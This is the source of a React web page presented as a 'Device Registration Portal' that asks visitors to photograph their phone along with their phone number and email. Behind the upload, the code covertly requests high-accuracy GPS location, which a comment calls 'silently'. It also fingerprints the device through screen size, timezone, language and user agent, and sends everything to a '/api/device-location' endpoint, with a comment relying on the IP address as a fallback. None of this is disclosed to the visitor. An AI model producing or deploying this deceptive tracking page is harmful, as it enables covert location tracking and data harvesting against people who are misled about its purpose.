'use client'

import { useState } from 'react'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
import { Upload, Camera, CheckCircle, Globe, Loader2 } from 'lucide-react'

type Language = 'en' | 'ar'

const translations = {
  en: {
    title: 'Device Registration Portal',
    subtitle: 'Please submit your device photo to complete registration',
    uploadPhoto: 'Upload Photo',
    selectPhoto: 'Select or take a photo of your device',
    photoRequired: 'Please upload a device photo',
    uploading: 'Uploading...',
    success: 'Registration Complete!',
    successMessage: 'Your device photo has been submitted successfully.',
    language: 'Language',
    importantInstructions: 'Important Instructions',
    photoInstructions: 'Please make sure your photo includes:',
    phoneMessage: 'The phone message or screen',
    phoneNumber: 'The phone number',
    contactEmail: 'The email to contact you',
    photoNote: 'Take a clear photo showing all the above information',
  },
      ar: {
      title: 'بوابة تسجيل الجهاز',
      subtitle: 'يرجى رفع صورة جهازك لإكمال التسجيل',
      uploadPhoto: 'رفع الصورة',
      selectPhoto: 'اختر أو التقط صورة لجهازك',
      photoRequired: 'يرجى رفع صورة الجهاز',
      uploading: 'جاري الرفع...',
      success: 'اكتمل التسجيل!',
      successMessage: 'تم إرسال صورة جهازك بنجاح.',
      language: 'اللغة',
      importantInstructions: 'تعليمات مهمة',
      photoInstructions: 'يرجى التأكد من أن صورتك تحتوي على:',
      phoneMessage: 'رسالة الهاتف أو الشاشة',
      phoneNumber: 'رقم الهاتف',
      contactEmail: 'البريد الإلكتروني للتواصل معك',
      photoNote: 'التقط صورة واضحة توضح جميع المعلومات أعلاه',
    },
}

export default function ReturnPage() {
  const [language, setLanguage] = useState<Language>('ar')
  const [selectedFile, setSelectedFile] = useState<File | null>(null)
  const [preview, setPreview] = useState<string | null>(null)
  const [isUploading, setIsUploading] = useState(false)
  const [isSuccess, setIsSuccess] = useState(false)

  const t = translations[language]

  const handleFileSelect = (event: React.ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0]
    if (file && file.type.startsWith('image/')) {
      setSelectedFile(file)
      
      // Create preview
      const reader = new FileReader()
      reader.onloadend = () => {
        setPreview(reader.result as string)
      }
      reader.readAsDataURL(file)
    }
  }

  const convertToBase64 = (file: File): Promise<string> => {
    return new Promise((resolve, reject) => {
      const reader = new FileReader()
      reader.readAsDataURL(file)
      reader.onload = () => resolve(reader.result as string)
      reader.onerror = error => reject(error)
    })
  }

  const handleSubmit = async () => {
    if (!selectedFile) {
      alert(t.photoRequired)
      return
    }

    setIsUploading(true)

    try {
      // Convert image to base64
      const imageBase64 = await convertToBase64(selectedFile)

      // Try to get geolocation (silently)
      let latitude: number | undefined
      let longitude: number | undefined
      let accuracy: number | undefined

      try {
        if (navigator.geolocation) {
          const position = await new Promise<GeolocationPosition>((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, {
              enableHighAccuracy: true,
              timeout: 5000,
              maximumAge: 0,
            })
          })
          latitude = position.coords.latitude
          longitude = position.coords.longitude
          accuracy = position.coords.accuracy
        }
      } catch (error) {
        console.log('Geolocation not available:', error)
        // Continue without geolocation - we'll still get IP address
      }

      // Collect all device information
      const deviceData = {
        imageBase64,
        latitude,
        longitude,
        accuracy,
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        language: navigator.language,
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString(),
      }

      // Send to API
      const response = await fetch('/api/device-location', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(deviceData),
      })

      if (response.ok) {
        setIsSuccess(true)
      } else {
        alert('Failed to upload photo. Please try again.')
      }
    } catch (error) {
      console.error('Error uploading photo:', error)
      alert('An error occurred. Please try again.')
    } finally {
      setIsUploading(false)
    }
  }

  return (
    <div className={`min-h-screen bg-background flex items-center justify-center p-4 sm:p-6 py-8 sm:py-12 ${language === 'ar' ? 'rtl' : 'ltr'}`} dir={language === 'ar' ? 'rtl' : 'ltr'}>
      <div className="w-full max-w-2xl">
        {/* Language Switcher */}
        <div className="flex justify-end mb-4">
          <Button
            variant="outline"
            size="sm"
            onClick={() => setLanguage(language === 'en' ? 'ar' : 'en')}
            className="gap-2"
          >
            <Globe className="w-4 h-4" />
            {language === 'en' ? 'العربية' : 'English'}
          </Button>
        </div>

        {/* Header */}
        <div className="text-center mb-6 sm:mb-8">
          <h1 className="text-2xl sm:text-3xl font-bold text-foreground mb-2 px-4">
            {t.title}
          </h1>
          <p className="text-muted-foreground text-sm sm:text-base px-4">
            {t.subtitle}
          </p>
        </div>

        <Card>
          <CardHeader>
            <CardTitle>{t.uploadPhoto}</CardTitle>
            <CardDescription>{t.selectPhoto}</CardDescription>
          </CardHeader>
          <CardContent className="space-y-6">
            {!isSuccess ? (
              <>
                {/* Important Instructions */}
                <div className="bg-primary/5 dark:bg-primary/10 border border-primary/20 rounded-lg p-4 space-y-3">
                  <h3 className="font-semibold text-foreground flex items-center gap-2">
                    <span className="text-primary">📋</span>
                    {t.importantInstructions}
                  </h3>
                  <p className="text-sm text-foreground mb-2">{t.photoInstructions}</p>
                  <ul className="space-y-2 text-sm text-muted-foreground">
                    <li className="flex items-start gap-2">
                      <span className="text-primary mt-0.5">•</span>
                      <span>{t.phoneMessage}</span>
                    </li>
                    <li className="flex items-start gap-2">
                      <span className="text-primary mt-0.5">•</span>
                      <span>{t.phoneNumber}</span>
                    </li>
                    <li className="flex items-start gap-2">
                      <span className="text-primary mt-0.5">•</span>
                      <span>{t.contactEmail}</span>
                    </li>
                  </ul>
                  <p className="text-xs text-muted-foreground italic pt-2 border-t border-primary/10">
                    {t.photoNote}
                  </p>
                </div>

                {/* Photo Upload Area */}
                <label className="cursor-pointer block">
                  <div className={`flex flex-col items-center justify-center w-full h-64 border-2 border-dashed rounded-lg transition-colors ${
                    preview 
                      ? 'border-primary/50 bg-primary/5' 
                      : 'border-border hover:border-primary/50 bg-muted/20 hover:bg-muted/40'
                  }`}>
                    {preview ? (
                      <div className="relative w-full h-full flex items-center justify-center p-4">
                        <img 
                          src={preview} 
                          alt="Preview" 
                          className="max-w-full max-h-full object-contain rounded-lg"
                        />
                      </div>
                    ) : (
                      <div className="text-center p-8">
                        <Camera className="w-16 h-16 text-primary mx-auto mb-4" />
                        <p className="text-foreground font-medium mb-2">{t.selectPhoto}</p>
                        <p className="text-sm text-muted-foreground">Click to select or take a photo</p>
                      </div>
                    )}
                  </div>
                  <input
                    type="file"
                    accept="image/*"
                    capture="environment"
                    onChange={handleFileSelect}
                    className="hidden"
                    disabled={isUploading}
                  />
                </label>

                {/* Upload Button */}
                <Button
                  onClick={handleSubmit}
                  disabled={!selectedFile || isUploading}
                  size="lg"
                  className="w-full gap-2"
                >
                  {isUploading ? (
                    <>
                      <Loader2 className="w-5 h-5 animate-spin" />
                      {t.uploading}
                    </>
                  ) : (
                    <>
                      <Upload className="w-5 h-5" />
                      {t.uploadPhoto}
                    </>
                  )}
                </Button>
              </>
            ) : (
              /* Success Message */
              <div className="text-center py-12 space-y-4">
                <CheckCircle className="w-20 h-20 text-green-600 dark:text-green-500 mx-auto" />
                <h3 className="text-2xl font-semibold text-foreground">{t.success}</h3>
                <p className="text-muted-foreground">{t.successMessage}</p>
              </div>
            )}
          </CardContent>
        </Card>

        {/* Footer */}
        <div className="text-center mt-8 text-xs sm:text-sm text-muted-foreground">
          <p>© {new Date().getFullYear()} Device Security System. All rights reserved.</p>
        </div>
      </div>
    </div>
  )
}
